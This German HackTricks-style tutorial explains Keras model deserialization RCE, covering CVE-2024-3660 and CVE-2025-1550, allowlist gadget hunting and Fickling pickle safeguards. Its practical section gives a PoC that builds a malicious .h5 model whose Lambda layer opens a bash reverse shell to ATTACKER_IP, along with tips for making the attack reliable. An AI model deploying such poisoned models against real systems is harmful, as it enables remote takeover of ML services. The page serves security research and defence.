# Keras-Modell-Deserialisierung-RCE und Gadget-Suche

{{#include ../../banners/hacktricks-training.md}}

Diese Seite fasst praktische Exploitation-Techniken für die Keras-Modell-Deserialisierungspipeline zusammen, erklärt die Interna des nativen .keras-Formats und dessen Angriffsfläche und stellt Forschenden Tools zur Suche nach Model File Vulnerabilities (MFVs) und Post-Fix-Gadgets bereit.

## Interna des .keras-Modellformats

Eine .keras-Datei ist ein ZIP-Archiv, das mindestens Folgendes enthält:<sup>[[1]](#references)</sup>
- metadata.json – allgemeine Informationen (z. B. die Keras-Version)
- config.json – Modellarchitektur (primäre Angriffsfläche)
- model.weights.h5 – Gewichte im HDF5-Format

config.json steuert die rekursive Deserialisierung: Keras importiert Module, löst Klassen und Funktionen auf und rekonstruiert Layer und Objekte aus vom Angreifer kontrollierten Dictionaries.<sup>[[1]](#references)</sup>

Beispielauszug für ein Dense-Layer-Objekt:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

Die Deserialisierung führt Folgendes aus:<sup>[[1]](#references)</sup>
- Importiert Module und löst Symbole anhand der Schlüssel `module`/`class_name` auf
- Ruft `from_config(...)` oder den Konstruktor mit vom Angreifer kontrollierten kwargs auf
- Rekursiver Aufruf für verschachtelte Objekte (Aktivierungen, Initializer, Constraints usw.)

Historisch bot dies einem Angreifer, der `config.json` erstellte, drei Möglichkeiten:<sup>[[1]](#references)</sup>
- Kontrolle darüber, welche Module importiert werden
- Kontrolle darüber, welche Klassen/Funktionen aufgelöst werden
- Kontrolle über die an Konstruktoren/`from_config` übergebenen kwargs

## CVE-2024-3660 – Lambda-layer bytecode RCE

Ursache:
- Bei der Legacy-Lambda-Deserialisierung wurde eine Python-Funktion aus vom Angreifer kontrolliertem, marshal-serialisiertem Code rekonstruiert: `func_load()` decodiert die Base64-Nutzlast, ruft `marshal.loads()` auf und erstellt ein `FunctionType`. Der Bytecode der resultierenden Funktion wird ausgeführt, wenn Lambda aufgerufen wird. Betroffene Loader vor Version 2.13 führten bei Legacy-Formaten keine Safe-Mode-Prüfungen durch.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

In einem nativen Keras-v3-Archiv wird die Lambda-Funktion als `__lambda__`-Objekt dargestellt, dessen Feld `code` marshal-serialisierten Code in Base64-kodierter Form enthält:<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

Gegenmaßnahmen:
- Keras erzwingt standardmäßig `safe_mode=True` für das native Keras-v3-Format. Serialisierte Python-Lambdas in `Lambda` werden blockiert, sofern ein Benutzer dies nicht ausdrücklich mit `safe_mode=False` deaktiviert; dieser Schutz gilt nicht in gleicher Weise für Legacy-Formate.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Hinweise:
- Legacy-Formate (ältere HDF5-Speicherungen) oder ältere Codebasen erzwingen möglicherweise keine modernen Prüfungen. Daher können Angriffe im Stil eines „Downgrades“ weiterhin funktionieren, wenn Opfer ältere Loader verwenden.

## CVE-2025-1550 – Beliebiger Modulimport in Keras 3.0.0–3.8.x

Ursache:
- `_retrieve_class_or_fn` verwendete `importlib.import_module(module)` für vom Angreifer kontrollierte Modulzeichenfolgen aus `config.json`.
- Auswirkung: Ein präpariertes `.keras`-Archiv konnte `Model.load_model()` dazu bringen, vom Angreifer ausgewählte Python-Module und -Funktionen zu importieren, einschließlich Nebenwirkungen zur Importzeit und vom Angreifer kontrollierter Argumente, selbst bei `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Exploit-Idee:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Sicherheitsverbesserungen (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Modul-Allowlist: Imports sind auf Module des offiziellen Ökosystems beschränkt: keras, keras_hub, keras_cv, keras_nlp
- Safe Mode standardmäßig aktiviert: safe_mode=True blockiert das unsichere Laden serialisierter Lambda-Funktionen
- Einfache Typprüfung: Deserialisierte Objekte müssen den erwarteten Typen entsprechen

## Praktische Ausnutzung: TensorFlow-Keras-HDF5-Lambda-RCE (.h5)

Ältere TensorFlow-Keras-Deployments akzeptieren möglicherweise weiterhin HDF5-Modelldateien (`.h5`). Wenn ein Angreifer ein Modell hochladen kann, das der Server später lädt oder für Inferenz verwendet, kann ein anfälliger Loader einen Lambda-Layer mit vom Angreifer kontrolliertem Python-Code deserialisieren, der dann im Modell-Workflow der Anwendung ausgeführt werden kann.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Minimales PoC zum Erstellen einer bösartigen .h5-Datei, deren Lambda-Funktion eine Reverse Shell ausführt, wenn das Ziel das Modell aufruft:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

Hinweise und Tipps zur Zuverlässigkeit:
- Auslöser variieren je nach Format und Workflow; im referenzierten Write-up wurde beobachtet, dass der Payload während der Vorhersage zweimal ausgeführt wurde. Gehe davon aus, dass Nebenwirkungen wiederholt auftreten, und gestalte Payloads idempotent.<sup>[[7]](#references)</sup>
- Versionen festlegen: Stimmen Sie die TF-/Keras-/Python-Versionen auf die des Opfers ab, um Serialisierungsfehler zu vermeiden. Erstellen Sie beispielsweise Artefakte mit Python 3.8 und TensorFlow 2.13.1, wenn das Ziel diese Versionen verwendet.<sup>[[7]](#references)</sup>
- Schnelle Replikation der Umgebung:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Validierung: Ein harmloser Payload wie `os.system("ping -c 1 YOUR_IP")` hilft, die Ausführung zu bestätigen (z. B. ICMP mit tcpdump beobachten), bevor zu einer Reverse Shell gewechselt wird.<sup>[[7]](#references)</sup>

## Gadget-Angriffsfläche innerhalb der Allowlist nach dem Fix

Selbst mit der Keras-Modul-Allowlist und dem Safe Mode können erlaubte Callables Nebenwirkungen auslösen. Beispielsweise lädt `keras.utils.get_file` eine URL herunter und speichert sie am konfigurierten Cache-Speicherort, wodurch es sich als Kandidat für eine Gadget-Analyse eignet.<sup>[[1]](#references)[[19]](#references)</sup>

Mögliche Lambda-Konfiguration (die Aufrufsignatur in einem kontrollierten Test überprüfen):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

Wichtige Einschränkung:
- `Lambda.call()` übergibt das Modelleingabeargument immer als erstes Positionsargument und die konfigurierten `arguments` als Schlüsselwortargumente. Bei `get_file` wird dieser Positionswert für `fname` verwendet; ein Konflikt zwischen Tensor und Pfad kann dazu führen, dass dieser Kandidat fehlschlägt, bevor ein Download stattfindet. Es handelt sich also nicht um ein garantiert funktionierendes Gadget.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## ML-Pickle-Import-Allowlisting für AI/ML-Modelle (Fickling)

Viele AI/ML-Modellformate (PyTorch `.pt`/`.pth`/`.ckpt`, joblib/scikit-learn-Artefakte und andere Python-native Formate) enthalten eingebettete Python-Pickle-Daten. Der oben beschriebene Legacy-Keras-Lambda-Pfad verwendet stattdessen marshalierten Function-Bytecode und stellt daher ein separates Deserialisierungsrisiko dar. Pickle-Opcodes können während der Deserialisierung vom Angreifer kontrolliertes Verhalten auslösen, einschließlich Modellmanipulation oder RCE. Einfache Scanner können neuartige oder nicht gelistete gefährliche Imports übersehen.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Eine praktische Fail-closed-Schutzmaßnahme besteht darin, den Pickle-Deserializer von Python zu hooken und beim Unpickling nur eine geprüfte Menge harmloser ML-bezogener Imports zuzulassen. Fickling von Trail of Bits setzt diese Richtlinie um und enthält eine kuratierte ML-Import-Allowlist, die anhand von Tausenden öffentlicher Hugging-Face-Pickles erstellt wurde.<sup>[[8]](#references)[[13]](#references)</sup>

Sicherheitsmodell für „sichere“ Imports (aus Forschung und Praxis abgeleitete Grundsätze): Von einem Pickle verwendete importierte Symbole müssen gleichzeitig:<sup>[[8]](#references)</sup>
- Keinen Code ausführen oder dessen Ausführung auslösen (keine kompilierten/Quellcodeobjekte, keine Shell-Aufrufe, Hooks usw.)
- Keine beliebigen Attribute oder Elemente abrufen oder setzen
- Keine anderen Python-Objekte aus der Pickle-VM importieren oder Referenzen darauf erhalten
- Keine sekundären Deserializer auslösen (z. B. marshal, verschachteltes Pickle), auch nicht indirekt

Aktivieren Sie Ficklings Schutzmaßnahmen so früh wie möglich beim Prozessstart, damit alle von Frameworks durchgeführten Pickle-Ladevorgänge (`torch.load`, `joblib.load` usw.) geprüft werden:<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

Betriebliche Tipps:
- Du kannst die Hooks bei Bedarf vorübergehend deaktivieren und wieder aktivieren:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- Wenn ein bekannt gutes Modell blockiert wird, erweitern Sie nach Prüfung der Symbole die Allowlist für Ihre Umgebung:<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling bietet außerdem generische Runtime-Guards, wenn du eine granularere Kontrolle bevorzugst:<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() erzwingt Prüfungen für alle pickle.load()
  - with fickling.check_safety(): für eine zeitlich begrenzte Durchsetzung
  - fickling.load(path) / fickling.is_likely_safe(path) für einmalige Prüfungen

- Bevorzuge nach Möglichkeit Model-Formate ohne pickle (z. B. SafeTensors).<sup>[[15]](#references)</sup> Wenn du pickle akzeptieren musst, führe Loader mit den geringstmöglichen Berechtigungen und ohne ausgehenden Netzwerkzugriff aus und setze die allowlist durch.

Diese allowlist-first-Strategie blockiert nachweislich gängige ML-pickle-Exploit-Pfade und gewährleistet zugleich eine hohe Kompatibilität. Im Benchmark von ToB erkannte Fickling 100 % der synthetischen schädlichen Dateien und ließ ~99 % der sauberen Dateien aus führenden Hugging-Face-Repos zu.<sup>[[8]](#references)[[10]](#references)</sup>


## Researcher-Toolkit

1) Systematische Gadget-Suche in erlaubten Modulen

Ermittle systematisch potenzielle Callables in keras, keras_nlp, keras_cv und keras_hub und priorisiere solche mit Datei-/Netzwerk-/Prozess-/Umgebungs-Nebeneffekten.<sup>[[1]](#references)</sup>

<details>
<summary>Potentiell gefährliche Callables in allowlisteten Keras-Modulen ermitteln</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) Direkte Deserialisierungstests (kein .keras-Archiv erforderlich)

Übergib präparierte dicts direkt an Keras-Deserialisierer, um herauszufinden, welche Parameter akzeptiert werden, und um Nebenwirkungen zu beobachten.<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) Versionsübergreifende Tests und Formate

Keras gibt es in mehreren Codebasen/Generationen mit unterschiedlichen Schutzmaßnahmen und Formaten:<sup>[[1]](#references)</sup>
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, soll entfernt werden)
- tf-keras: wird separat gepflegt
- Multi-backend Keras 3 (official): führte das native .keras-Format ein

Wiederhole die Tests über verschiedene Codebasen und Formate hinweg (.keras vs. legacy HDF5), um Regressionen oder fehlende Schutzmaßnahmen aufzudecken.

## References

- [1] [Suche nach Schwachstellen bei der Deserialisierung von Keras-Modellen (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Prüfungen zur Serialisierung hinzugefügt](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE durch Deserialisierung von Keras Lambda](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Beliebiger Modulimport in Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr-Bericht – beliebiger Import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr-Bericht – beliebiger Import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow .h5 Lambda RCE bis zu root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail of Bits Blog – Ficklings neuer AI/ML-Pickle-Dateiscanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Schutz von AI/ML-Umgebungen (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Benchmark-Korpus für das Scannen von Fickling-Pickles](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Hintergrund zu Sleepy-Pickle-Angriffen](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors-Projekt](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Keras-2-Lambda-Layer ermöglichen beliebige Code-Injection](https://kb.cert.org/vuls/id/253266)
- [17] [Quellcode der Keras-Lambda-Layer (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Quellcode der Keras-Python-Hilfsfunktionen (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [Keras-API `get_file`](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../../banners/hacktricks-training.md}}
